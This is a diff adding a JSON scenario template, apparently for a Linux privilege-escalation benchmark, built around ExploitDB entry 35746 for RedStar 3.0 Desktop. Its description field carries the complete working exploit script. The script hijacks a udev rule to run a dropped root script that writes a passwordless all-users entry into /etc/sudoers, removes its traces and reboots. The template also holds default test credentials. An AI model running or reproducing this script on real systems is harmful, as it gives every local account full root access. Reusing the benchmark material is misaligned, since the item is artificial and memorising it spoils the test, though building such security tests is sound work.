@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_35746",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: RedStar 3.0 Desktop - Enable sudo Privilege Escalation (OSVDB-117036)\n\nExploit source code (35746.sh):\n```\n#!/bin/bash -e\n\n## Alternative steps: https://pbs.twimg.com/media/B68inqBIQAA5sK6.png\n## Proof: https://github.com/HackerFantastic/Public/blob/master/exploits/redstar3.0-localroot.png\n\ncp /etc/udev/rules.d/85-hplj10xx.rules /tmp/udevhp.bak\necho 'RUN+=\"/bin/bash /tmp/r00t.sh\"' > /etc/udev/rules.d/85-hplj10xx.rules\ncat <<EOF >/tmp/r00t.sh\necho -e \"ALL\\tALL=(ALL)\\tNOPASSWD: ALL\" >> /etc/sudoers\nmv /tmp/udevhp.bak /etc/udev/rules.d/85-hplj10xx.rules\nchown 0:0 /etc/udev/rules.d/85-hplj10xx.rules\nrm /tmp/r00t.sh\nEOF\nchmod +x /tmp/r00t.sh\necho \"sudo will be available after reboot\"\nsleep 2\nreboot\n\n## Source: https://twitter.com/sfan55/status/550348619652796416 & http://www.openwall.com/lists/oss-security/2015/01/09/6\n```",
+  "cve": "OSVDB-117036",
+  "exploitdb_id": "35746",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_35746",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
